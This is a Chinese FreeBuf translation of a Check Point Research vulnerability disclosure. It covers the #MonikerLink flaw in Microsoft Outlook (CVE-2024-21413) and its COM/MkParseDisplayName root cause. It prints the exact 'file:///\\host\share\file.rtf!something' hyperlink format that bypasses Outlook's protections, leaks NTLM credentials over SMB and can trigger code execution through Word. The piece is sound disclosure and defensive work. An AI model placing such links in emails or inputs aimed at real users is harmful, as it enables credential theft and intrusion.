#  微软Outlook中#MonikerLink漏洞的风险和大局观   
晶颜123  FreeBuf   2024-02-23 18:59  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38jUokdlWSNlAjmEsO1rzv3srXShFRuTKBGDwkj4gvYy34iajd6zQiaKl77Wsy9mjC0xBCRg0YgDIWg/640?wx_fmt=gif "")  
  
  
近日，Check Point Research发布了一份名为  
《明显的、一般的和高级的：Outlook攻击向量的综合分析》  
（The Obvious, The Normal and The Advanced: a Comprehensive Analysis of Outlook Attack Vectors）的白皮书，详细介绍了Outlook上的各种攻击向量，以帮助业界了解流行的Outlook应用程序可能给组织带来的安全风险。  
  
  
正如文中提到的，研究人员发现Outlook在处理特定超链接时存在一个有趣的安全问题。在这篇博文中，Check Point研究人员将与安全社区分享其对这个问题的研究，并提供了安全防御建议。同时，研究人员还将强调此错误在其他软件中的广泛影响。  
  
  
**Outlook上的超链接行为**  
  
  
  
正如  
《明显的、一般的和高级的：Outlook攻击向量的综合分析》  
第一节所讨论的那样，如果超链接以“http://”或“https://”开头，Outlook会很高兴地启动（默认的）Windows浏览器并打开web URL。这是每个Outlook用户都知道的一个非常明显的行为。  
  
  
有人可能想知道除http/https之外的其他协议表现如何？为此，研究人员特地做了测试。结果显示，如果链接字符串以一个典型的应用程序URL协议开头，并且Outlook认为该URL协议可能存在一些安全问题，例如，“Skype”URL协议，如下所示（在HTML电子邮件中）：  
```
*<a href="skype:SkypeName?call">Call me on Skype</a>*
```  
  
  
那么，当单击该链接时，就会弹出一个警告对话框，警告我们打开该链接可能不安全。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5PWibCtlU3GeY6aIcKv3m3YBml6dGqQkySUqlPqIg0OTmAlBa6UQEhF6A/640?wx_fmt=jpeg&from=appmsg "")  
  
【图1：当用户单击第三方URL协议超链接时，Outlook会发出警告】  
  
  
现在，目光转向常见的“file://”协议。研究人员首先使用下述协议进行测试，使用该协议指向远程Word文件（如果想要重现测试，请将IP地址替换为您自己的IP地址）。  
```
*<a href=”file:///\\10.10.111.111\test\test.rtf”>CLICK ME</a>*
```  
  
（右滑查看更多）  
  
  
结果显示，当点击超链接时，并非出现像之前的“Skype”URL协议那样的警告对话框。但是，在Windows通知中心中有向用户显示错误消息。并且远程“test.rtf”文件确实没有被访问。Windows通知中心区域中的错误信息如下所示：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5PdtibcWE4Ff9DN2icjnPmSLIVf4ex9vYIfWqh5BISFib3MIwHkicv84NXiaA/640?wx_fmt=jpeg&from=appmsg "")  
  
【图2：当用户单击指向远程文件的典型超链接时，Outlook显示一条错误消息】  
  
  
这是合理的，且有利于安全。如果Outlook允许用户访问远程文件，那么至少会泄露本地NTLM凭据信息，因为访问远程资源将通过SMB协议，而SMB协议将使用本地凭据进行身份验证。  
  
  
**#MonikerLink漏洞**  
  
  
  
但是，如果对上面的链接进行一个轻微的修改，例如修改为如下形式：  
```
*<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>*
```  
  
（右滑查看更多）  
  
  
注意，研究人员在“test.rtf”的末尾添加了一个“!”，还添加了一些随机字符“something”。  
  
  
这样的链接将绕过前面讨论的现有Outlook安全限制，并且当用户单击该链接时，Outlook将继续访问远程资源“\\10.10.111.111\test\test.rtf”。  
  
  
这里的关键是特殊的感叹号“!”，这将改变Outlook的行为。  
  
  
**漏洞影响**  
  
  
### 1. 泄露本地NTLM凭据信息  
  
  
很容易观察到，访问远程“test.rtf”的尝试将使用SMB协议（端口445），并且在此过程中会泄漏本地NTLM凭据信息。这与许多其他NTLM凭据泄露技巧的过程相同。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5PBlsJRJFg98MkhTNgCMoeA5AZibzzRAZXEmqtnwNDh7mEtI0F6ENXXNQ/640?wx_fmt=jpeg&from=appmsg "")  
  
【图3：#MonikerLink作为漏洞被利用时泄露的NTLM凭据信息】  
###   
### 2. 从新的攻击向量到任意代码执行  
  
  
除了泄露本地NTLM凭据信息外，该漏洞还能做到更多吗？这也是研究人员花了很多时间研究的更深层次的问题。从本质上讲，我们需要弄清楚当用户点击像“file:///\\10.10.111.111\test\test.rtf!something”这样的链接时到底发生了什么。  
  
  
事实上，根据深入分析显示，Outlook将该链接视为“Moniker Link”。Monikers是Windows上组件对象模型（COM）的关键概念之一。  
“Moniker Link”字符串意味着调用者将使用该字符串“查找”COM对象。  
  
  
从技术上讲，Outlook调用“ole32!MkParseDisplayName()”API来完成这项工作——解析Moniker Link字符串并使用它来“查找”COM对象。在调试Outlook时，我们可以通过在Windbg的API上设置一个简单的断点（breakpoint）来确认这一点。只要用户点击链接，断点就会被触发。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5P9vJYc4Oz7YFUsPsG5VuqJd3NS6iciaVkdlfNCdzoXsk4XaeicW6ibCwkRg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
根据微软的API文档显示，API“MkParseDisplayName()”的第二个参数“szUserName”是要解析的“显示名”。我们来验证一下。  
```
0:000> du poi(esp+4*2)
1a168620 "\\10.10.111.111\test\test.rtf!something"
```  
  
（右滑查看更多）  
  
  
可以看到，这里URL协议前缀“file:///”被删除了。  
  
  
此外，正如API文档中所解释的，当它涉及“!”，这意味着这是一个复合名字：一个基于“\\10.10.111.111\test\test.rtf”的FileMoniker，和一个基于“something”的ItemMoniker。  
  
  
因此，测试过程确认了Outlook调用API - MkParseDisplayName()来查找Moniker Link字符串指向的COM对象的过程。  
  
  
组件对象模型（COM）相当复杂；它涉及很多概念。但是简单地说，对于这个场景，调用者（这里是指Outlook应用程序）只调用COM助手API（这里是“MkParseDisplayName()”）来完成这项工作。它实际上取决于目标应用程序（“COM服务器”）如何以及为COM对象返回什么。COM服务器实现并向调用者或包装器API公开某些COM接口。这个过程本质上类似于从您的应用程序运行一个外部应用程序（但是COM要复杂得多）。因此，它可能会导致各种安全问题。  
  
  
对于上面的例子——FileMoniker + ItemMoniker的复合名字，因为扩展名是“.rtf”，它调用/runs Microsoft Word来“查找”由Moniker Link指向的COM对象。Word是一个设计良好的基于COM的应用程序。这个过程基本上如下所示。  
  
1. Windows将Microsoft Word作为COM服务器在后台运行（不显示正常的Word UI）。  
  
1. 在后台，Word基于字符串“\\10.10.111.111\test\test.rtf”打开并解析file moniker所指向的文件“rtf”。之后，它基于字符串“something”尝试查找由item moniker指向的对象。  
  
这就是问题所在，Word打开并解析“test.rtf”文件——该文件位于攻击者控制的服务器上，由攻击者控制。如果在Word解析test.rtf文件的过程中出现错误（比如代码执行错误），该怎么办？  
  
  
对于这一问题，研究人员已经成功地使用了.rtf 概念验证代码（PoC）并复制了攻击（见下图），结果显示，它在“WINWORD.EXE”进程中崩溃。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5PKOJXWVzzWZYO7UZKfA9dPZpkv0c2xHvfsFS9Ew2gxsc5iaUibiaxTr32g/640?wx_fmt=jpeg&from=appmsg "")  
  
【图4：当#MoinkerLink被用作攻击向量时，可能的远程代码执行演示】  
  
  
我们还可以看到后台Word进程作为COM服务器启动，如上图突出显示的函数名所示。  
  
  
更严重的是，整个过程不涉及保护视图模式——后台Word进程以中等完整性级别运行。所以，这个攻击向量甚至绕过了Protected View。这将使攻击者更容易在受害者的机器上获得代码执行。  
  
  
需要再次强调的是，Word（RTF PoC）在这里只是一个例子。由于COM的性质，它实际上取决于被利用的应用程序（COM服务器）以及该应用程序的安全性。我们在此讨论的“Moniker Link”问题是一种攻击向量，它为未来利用许多应用程序“敞开了大门”。有些应用程序甚至可能不是Windows上默认安装的应用程序，用户可能会不时安装这些应用程序。因此，这个攻击向量打开了一个相当大的攻击面。  
  
  
有趣的是，甚至有一个微软文档公开表示，使用MkParseDisplayName()或MkParseDisplayNameEx()来解析攻击者控制的输入是不安全的。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38COhAGL1UiaNSe0bOURNu5PWlKvka7pa665DnlrwK7BtMlnROsQAzuKlph1xQqAD8IE3IibX3eLEkw/640?wx_fmt=jpeg&from=appmsg "")  
  
【图5：微软警告在微软文档中使用MkParseDisplayName/MkParseDisplayNameEx API的风险】  
  
  
**与其他Outlook攻击向量严重性比较**  
  
  
  
现在，我们了解了整个过程和问题。一些读者可能会怀疑这是否是一个真正的问题？将其与Outlook上的其他攻击向量进行比较会如何？这是个好问题。  
  
  
Outlook攻击向量的完整概述已经很好地解答了这个问题。正如研究人员在  
报告  
中研究和定义的那样，单次点击的得分为1.0，比如单次点击一个超链接。  
  
  
让我们假设攻击者利用Microsoft Word在没有受保护视图的情况下工作（因为这是最常见的情况）。如果该漏洞利用是作为附件发送的，攻击者需要受害者在附件上执行一次“双击”。然而，这并不是总数，因为从外部电子邮件地址发送的附件会激活Word上的Protected View，这将阻止攻击者的漏洞利用，因为当Protected View被激活时，漏洞利用不起作用。这意味着攻击者需要欺骗受害者执行另一次“单击”以退出Word保护视图模式，以便他/她的漏洞可以运行。  
  
  
所以，总的来说，整个攻击链只需要一次“双击”和一次“单击”。用户互操作性的得分为1.2 + 1 = 2.2。  
  
  
如果攻击者使用“Moniker Link”攻击向量提供漏洞利用，则只需“单击”一次（单击链接），并且还可以绕过Protected View。所以，总分只有1.0。它比传统的2.2分数好得多（分数越低，对攻击者越有利，对用户越不利）。  
  
  
因此，现在我们可以清楚地理解，攻击者使用“Moniker Link”攻击向量提供Word漏洞利用更方便，同时这也意味着对用户安全更不利。  
  
  
（*注意：对“Moniker Link”攻击向量有更多的要求，比如利用需要与Word COM-server模式一起工作，受害者的网络需要允许外部攻击者的出站SMB流量）  
  
  
**防御和缓解**  
  
  
  
研究人员已经在最新的Windows 10/11 + Microsoft 365（Office 2021）环境中验证了这个#MonikerLink漏洞/攻击向量。其他Office版本也可能受到影响。事实上，研究人员认为这可能是一个被忽视的问题，在Windows/COM生态系统中存在了几十年，因为它位于COM API的核心。  
  
目前，Checkpoint研究人员已经向微软安全响应中心（MSRC）报告了这个问题，微软方面也已在2024年2月的补丁星期二（CVE-2024-21413）发布了一个重要的Outlook安全更新，CVSS得分为9.8。再次，我们强烈建议所有Outlook用户尽快应用官方补丁。  
  
  
**大局观**  
  
  
  
本质上，这个#MonikerLink漏洞（或攻击向量）是通过使用不安全的API （MkParseDisplayName/MkParseDisplayNameEx）引入的安全风险。因此，这个安全问题很可能不仅存在于Microsoft Outlook中，也可能存在于以不安全的方式使用API的其他软件中并影响它们。研究人员只是碰巧在Outlook中发现了这个问题。  
  
  
因此，在此呼吁安全和开发人员社区也在其他软件中找到并修复此类错误（攻击向量），因为现实世界中存在太多的软件。执行这个测试相当容易。如果您是QA或安全工程师，您可以将“file:///\\ip\test\test.rtf!”格式的超链接放到目标软件将要处理的输入的某个地方，并监控目标软件在处理输入时的行为。如果您是开发人员，请注意MkParseDisplayName/MkParseDisplayNameEx Windows API（以及一些Wrapper API）的用法。  
  
  
它有点像影响Java生态系统的#log4j错误，但这个#MonikerLink错误/攻击向量影响的是Windows/COM生态系统。  
  
  
**结论**  
  
  
在这篇博文中，我们披露了Outlook中的一个重大安全问题，被称为#MonikerLink漏洞。该漏洞不仅允许泄漏本地NTLM信息，还可能允许远程代码执行以及更多攻击向量。当它被用作攻击向量来攻击其他Office应用程序时，它也可以绕过Office Protected View。我们还将此攻击向量与之前发布的  
Outlook报告  
中讨论的其他攻击向量进行了比较，发现此问题的风险不容忽视。我们强烈建议相关用户和读者采取适当的行动，来保护他们的组织免受可能导致的潜在安全风险。  
  
  
通过深入研究，我们还发现这个#MonikerLink漏洞/攻击向量很可能不仅存在于Microsoft Outlook中，也可能存在于并影响其他软件。为此，我们建议安全和开发人员社区发现并修复此类漏洞。  
  
  
【  
FreeBuf粉丝交流群招新啦！  
  
在这里，拓宽网安边界  
  
甲方安全建设干货；  
  
乙方最新技术理念；  
  
全球最新的网络安全资讯；  
  
群内不定期开启各种抽奖活动；  
  
FreeBuf盲盒、大象公仔......  
  
扫码添加小蜜蜂微信回复“加群”，申请加入群聊  
】  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ich6ibqlfxbwaJlDyErKpzvETedBHPS9tGHfSKMCEZcuGq1U1mylY7pCEvJD9w60pWp7NzDjmM2BlQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/oQ6bDiaGhdyodyXHMOVT6w8DobNKYuiaE7OzFMbpar0icHmzxjMvI2ACxFql4Wbu2CfOZeadq1WicJbib6FqTyxEx6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icEEJemUSFlfufMicpZeRJZJ61icYlLmBLDpdYEZ7nIzpGovpHjtxITB6ibiaC3R5hoibVkQsVLQfdK57w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
> https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icEEJemUSFlfufMicpZeRJZJ7JfyOicficFrgrD4BHnIMtgCpBbsSUBsQ0N7pHC7YpU8BrZWWwMMghoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247492409&idx=1&sn=0989200153f6f4679af989e0852c8789&chksm=ce1f19a6f96890b01a5f5cab663742e640859aa44f27f3bb31eb0eca8c2fd920bdb9839a5c19&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247492374&idx=1&sn=0b847c8f0f000881d8efc5c646ef4181&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651253272&idx=1&sn=82468d927062b7427e3ca8a912cb2dc7&scene=21#wechat_redirect)  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
